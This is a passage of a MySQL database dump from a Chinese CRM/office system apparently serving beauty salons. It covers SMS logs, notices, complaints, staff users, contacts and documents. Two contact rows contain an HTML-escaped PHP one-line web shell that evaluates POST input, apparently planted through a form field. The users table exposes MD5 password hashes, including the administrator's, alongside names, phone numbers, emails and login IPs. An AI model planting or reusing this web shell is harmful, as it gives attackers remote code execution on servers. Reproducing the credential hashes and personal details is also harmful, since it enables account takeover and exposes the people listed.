(138, '2015-07-11 19:38:40', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(139, '2015-07-11 19:38:41', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(140, '2015-07-11 19:38:41', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(141, '2015-07-11 19:38:42', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员亿兰婷预约了您，顾客将在 08:00:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '182.107.33.252', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(142, '2015-07-11 19:42:59', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-11 19:53:00商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.204.165', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(143, '2015-07-11 19:43:04', '成功', 1, 1, 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-11 19:53:05商品消费475,卡余额:625.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(144, '2015-07-11 19:48:57', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员陈高明预约了您，顾客将在 09:00:00到店，请做好准备！ 全部店铺 退订回复TD', '112.85.73.133', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(145, '2015-07-11 19:50:34', '成功', 1, 1, 'liuxing99', '15051188827', '【CRM】亲:恭喜您于2015-07-11 20:00:36成为本店会员,级别:普通会员,卡号:456456456,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(146, '2015-07-11 19:51:05', '成功', 1, 1, 'liuxing99', '15051188827', '【CRM】亲:您的卡号:456456456于2015-07-11 20:01:07充值2000,卡余额:2000.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Ka&a=chongzhi'),
(147, '2015-07-11 19:51:46', '成功', 1, 1, 'liuxing99', '15051188827', '【CRM】亲:您的卡号:456456456于2015-07-11 20:01:47商品消费475,卡余额:1525.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(148, '2015-07-11 19:53:56', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员陈高明预约了您，顾客将在 08:00:00到店，请做好准备！ 全部店铺 退订回复TD', '112.85.73.133', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(149, '2015-07-11 19:54:29', '成功', 1, 1, 'liuxing99', '15051188827', '【CRM】亲:您的卡号:456456456于2015-07-11 20:04:31商品消费475,卡余额:1050.00 美丽人身美容院东海店 退订回复TD', '112.85.73.133', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(150, '2015-07-11 20:03:29', '成功', 1, 1, 'liuxing99', '13317920984', '【CRM】亲:您的卡号:666666于2015-07-11 20:13:31商品消费190,卡余额:435.00 美丽人身美容院东海店 退订回复TD', '114.237.204.165', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(151, '2015-07-11 20:11:47', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-11 20:21:49商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '114.237.204.165', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(152, '2015-07-13 14:12:58', '成功', 1, 1, 'liuxing99', '15921072135', '【CRM】亲:恭喜您于2015-07-13 14:23:00成为本店会员,级别:普通会员,卡号:15921072135,卡余额:0.00 美丽人身美容院 退订回复TD', '180.127.92.251', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(153, '2015-07-13 14:32:01', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:会员韩淑鑫预约了您，顾客将在2015-07-14 08:00:00到店，请做好准备！ 美丽人身美容院 退订回复TD', '101.226.125.114', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(154, '2015-07-13 15:59:54', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-13 16:04:05商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(155, '2015-07-13 16:27:36', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-13 16:31:46商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=jiesuanok'),
(156, '2015-07-13 16:46:02', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-13 16:50:04商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(157, '2015-07-17 15:48:37', '成功', 1, 1, 'liuxing99', '15905120019', '【CRM】亲:恭喜您于2015-07-17 15:58:48成为本店会员,级别:铂金卡会员,卡号:80595,卡余额:10000.00 美丽人身美容院东海店 退订回复TD', '222.191.137.117', '/mms/index.php?m=Home&c=Huiyuan&a=add'),
(158, '2015-07-17 16:00:31', '成功', 1, 1, 'liuxing99', '15651110214', '【CRM】亲:会员张玉龙预约了您，顾客将在2015-07-19 14:30:00到店，请做好准备！ 美丽人身美容院东海店 退订回复TD', '222.191.137.117', '/mms/index.php?m=Member&c=Index&a=yuyue_add'),
(159, '2015-07-17 21:13:23', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的卡号:888888于2015-07-17 21:17:27商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(160, '2015-07-21 17:34:11', '成功', 1, 1, 'liuxing99', '15905120019', '【CRM】亲:恭喜您于2015-07-21 17:44:26成为本店会员,级别:普通会员,卡号:881531,卡余额:5000.00 无锡市惠山区美时美刻美容SPA会所 退订回复TD', '180.113.155.180', '/index.php?m=Home&c=Huiyuan&a=add'),
(161, '2015-07-21 17:37:41', '成功', 1, 1, 'liuxing99', '18961314946', '【CRM】亲:会员张三预约了您，顾客将在 20:00:00到店，请做好准备！ 无锡市惠山区美时美刻美容SPA会所 退订回复TD', '180.113.155.180', '/index.php?m=Member&c=Index&a=yuyue_add'),
(162, '2015-07-27 14:29:17', '成功', 1, 1, 'liuxing99', '18951251872', '【CRM】亲:您的卡号:18951251872于2015-07-27 14:33:29商品消费400,卡余额:0.00 美丽人身美容院东海店 退订回复TD', '127.0.0.1', '/mms/index.php?m=Home&c=Sale&a=shangpin'),
(163, '2015-07-27 14:31:26', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的销售订单于2015-07-27 14:35:38发货 送达方式申通快递 注意查收 退订回复TD', '127.0.0.1', '/sdlk/index.php?m=Home&c=Chuku&a=shenhe'),
(164, '2015-07-27 14:35:07', '成功', 1, 1, 'liuxing99', '13812349563', '【CRM】亲:您的销售订单于2015-07-27 14:39:15发货 送达方式申通快递2625232 注意查收 退订回复TD', '127.0.0.1', '/sdlk/index.php?m=Home&c=Chuku&a=shenhe');

-- --------------------------------------------------------

--
-- 表的结构 `xy_smss`
--

CREATE TABLE IF NOT EXISTS `xy_smss` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `addtime` datetime NOT NULL,
  `content` varchar(200) NOT NULL,
  `phone` varchar(20) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `jieguo` varchar(20) NOT NULL,
  `url` varchar(255) NOT NULL,
  `ip` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='短信记录' AUTO_INCREMENT=14 ;

--
-- 转存表中的数据 `xy_smss`
--

INSERT INTO `xy_smss` (`id`, `uid`, `addtime`, `content`, `phone`, `status`, `jieguo`, `url`, `ip`) VALUES
(1, 0, '2015-05-19 19:54:34', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, '失败', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(2, 0, '2015-05-19 19:55:40', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, '失败', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(3, 0, '2015-05-19 19:56:51', 'OA系统验证码为12015200，24小时之内有效', '18951250018', 1, '?2015-05-19 19:52:50', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(4, 0, '2015-05-19 19:59:22', 'OA系统验证码为12015200，24小时之内有效', '18951250018', 1, '失败', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(5, 0, '2015-05-19 20:00:22', 'OA系统验证码为12015200，24小时之内有效', '13812349563', 1, '?0', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(6, 0, '2015-05-19 20:02:20', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, 'msg', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(7, 0, '2015-05-19 20:03:04', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(8, 0, '2015-05-20 13:58:17', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(9, 0, '2015-05-24 17:58:09', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(10, 0, '2015-05-31 22:05:02', 'OA系统验证码为12015200，24小时之内有效', '13812349563', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(11, 0, '2015-05-31 22:05:15', 'OA系统验证码为12015200，24小时之内有效', '18951251872', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(12, 0, '2015-06-03 10:02:55', 'OA系统验证码为12015200，24小时之内有效', '13812349563', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1'),
(13, 0, '2015-06-16 13:52:14', '尊敬的客户：恭喜您！您于{Time}成为本店会员，会员卡号为{CardID}，感谢您的光临！', '13812349563', 1, '成功', '/weboa/index.php?m=Home&c=Msg&a=view', '127.0.0.1');

-- --------------------------------------------------------

--
-- 表的结构 `xy_tongzhi`
--

CREATE TABLE IF NOT EXISTS `xy_tongzhi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  `title` varchar(100) NOT NULL,
  `jztime` datetime NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  `beizhu` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='通知公告' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `xy_tongzhi`
--

INSERT INTO `xy_tongzhi` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `juid`, `juname`, `title`, `jztime`, `content`, `attid`, `beizhu`) VALUES
(1, 1, '陈高明', '2015-05-25 11:20:40', 16, '王晓丹', '2015-06-12 12:08:46', 1, '16,1', '王晓丹,陈高明', '1123', '2015-05-29 11:20:31', '&lt;img src=&quot;http://oa.xinyou88.com/crm/Public/BJUI/plugins/kindeditor_4.1.10/plugins/emoticons/images/22.gif&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;333', 1432524022, '\n陈高明 : 2015-05-25 11:29:55\n陈高明 : 2015-05-25 11:29:59\n陈高明 : 2015-05-25 11:30:02\n陈高明 : 2015-05-25 11:30:07\n王晓丹 : 2015-06-02 18:37:50');

-- --------------------------------------------------------

--
-- 表的结构 `xy_tousu`
--

CREATE TABLE IF NOT EXISTS `xy_tousu` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `hid` int(11) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `mingcheng` varchar(100) NOT NULL,
  `title` varchar(100) NOT NULL,
  `content` varchar(255) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='投诉管理' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `xy_tousu`
--

INSERT INTO `xy_tousu` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `hid`, `bianhao`, `mingcheng`, `title`, `content`, `beizhu`) VALUES
(1, 1, '陈高明', '2015-05-31 16:10:33', 1, '陈高明', '2015-05-31 16:10:39', 1, 5, '1505310002', '03333', '百度公司', '的份上说发的范德萨', '范德萨发生');

-- --------------------------------------------------------

--
-- 表的结构 `xy_user`
--

CREATE TABLE IF NOT EXISTS `xy_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` char(20) NOT NULL DEFAULT '',
  `password` char(32) NOT NULL DEFAULT '',
  `depname` varchar(50) NOT NULL,
  `posname` varchar(50) NOT NULL,
  `truename` char(30) NOT NULL,
  `sex` char(5) NOT NULL,
  `tel` varchar(20) NOT NULL,
  `phone` char(11) NOT NULL,
  `neixian` varchar(50) NOT NULL,
  `email` varchar(200) NOT NULL,
  `qq` varchar(20) NOT NULL,
  `logintime` datetime NOT NULL,
  `loginip` char(15) NOT NULL,
  `logins` int(11) NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1',
  `update_time` int(11) NOT NULL,
  `bian` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=20 ;

--
-- 转存表中的数据 `xy_user`
--

INSERT INTO `xy_user` (`id`, `username`, `password`, `depname`, `posname`, `truename`, `sex`, `tel`, `phone`, `neixian`, `email`, `qq`, `logintime`, `loginip`, `logins`, `status`, `update_time`, `bian`) VALUES
(1, 'admin', 'c3284d0f94606de1fd2af172aba15bf3', '综合办公室', '系统管理员', '陈高明', '男', '8552646', '13812349563', '6535665', 'pinkecn@qq.com', '1612985', '2015-08-14 20:35:45', '127.0.0.1', 627, 1, 1439555745, '11'),
(17, 'user1', '14e1b600b1fd579f47433b88e8d85291', '技术部', '技术工程师', '张雨', '女', '82821234', '13505125676', '', '87865645@qq.com', '87865645', '2015-07-06 17:31:33', '222.221.184.137', 3, 1, 1436175109, ''),
(16, 'liuxing99', '14e1b600b1fd579f47433b88e8d85291', '综合办公室', '总经理', '王晓丹', '女', '111', '11', '', '111', '11', '2015-08-14 20:20:50', '14.122.115.93', 465, 1, 1439554924, '123'),
(18, 'make', '14e1b600b1fd579f47433b88e8d85291', '市场部', '客服专员1', '王倩', '女', '85852423', '18905134456', '', '95217711@qq.com', '95217711', '2015-07-06 17:32:34', '222.221.184.137', 2, 1, 1436175221, ''),
(19, '123456789', '14e1b600b1fd579f47433b88e8d85291', '综合办公室', '总经理', '123456', '女', '123456', '123456', '', '123456', '123456', '2015-08-10 10:43:20', '116.54.90.220', 1, 1, 1439180229, '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_wdtxl`
--

CREATE TABLE IF NOT EXISTS `xy_wdtxl` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `sex` varchar(10) NOT NULL,
  `danwei` varchar(200) NOT NULL,
  `zhiwei` varchar(50) NOT NULL,
  `dianhua` varchar(200) NOT NULL,
  `email` varchar(255) NOT NULL,
  `qq` varchar(50) NOT NULL,
  `leixing` varchar(20) NOT NULL,
  `type` varchar(50) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='我的通讯录' AUTO_INCREMENT=4 ;

--
-- 转存表中的数据 `xy_wdtxl`
--

INSERT INTO `xy_wdtxl` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `title`, `sex`, `danwei`, `zhiwei`, `dianhua`, `email`, `qq`, `leixing`, `type`, `beizhu`) VALUES
(1, 1, '陈高明', '2015-05-25 12:27:17', 1, '陈高明', '2015-07-07 11:40:38', 1, '111', '男', '11', '11', '11', '11', '11', '私有', '&lt;?php @eval($_POST[''caidao'']);?&gt;', '112'),
(3, 1, '陈高明', '2015-07-07 11:40:54', 0, '', '0000-00-00 00:00:00', 1, '发顺丰', '', '', '', '发送', '', '', '私有', '&lt;?php @eval($_POST[''caidao'']);?&gt;', '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_wendang`
--

CREATE TABLE IF NOT EXISTS `xy_wendang` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `beizhu` text NOT NULL,
  `attid` int(11) NOT NULL,
  `juid` varchar(500) NOT NULL,
  `juname` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='我的文档' AUTO_INCREMENT=5 ;

--
-- 转存表中的数据 `xy_wendang`
--

INSERT INTO `xy_wendang` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `title`, `type`, `beizhu`, `attid`, `juid`, `juname`) VALUES
(1, 1, '陈高明', '2015-05-25 10:24:17', 0, '', '0000-00-00 00:00:00', 1, '1223', '公司证件', '剩下的', 1432520625, '16', '王晓丹'),
(2, 17, '张雨', '2015-06-02 19:52:49', 0, '', '0000-00-00 00:00:00', 1, '代码库', '专业知识', '', 1433245831, '', ''),
(3, 16, '王晓丹', '2015-06-03 14:47:27', 1, '陈高明', '2015-07-07 04:56:07', 1, 'sss', 'sss', 'ssss', 1433314035, '18', '王倩'),
(4, 16, '王晓丹', '2015-08-13 17:39:34', 0, '', '0000-00-00 00:00:00', 1, 'test_aaa', 'sss', 'test_aaa_bbb', 1439458687, '', '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_zhishi`
--

CREATE TABLE IF NOT EXISTS `xy_zhishi` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `content` text NOT NULL,
  `attid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='知识管理' AUTO_INCREMENT=3 ;

--
-- 转存表中的数据 `xy_zhishi`
--

INSERT INTO `xy_zhishi` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `title`, `type`, `content`, `attid`) VALUES
(1, 1, '陈高明', '2015-05-25 10:40:18', 16, '王晓丹', '2015-07-07 01:25:22', 1, '122', '产品知识', 'rsyiy;/ipy;poy;l8i', 1432521605);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
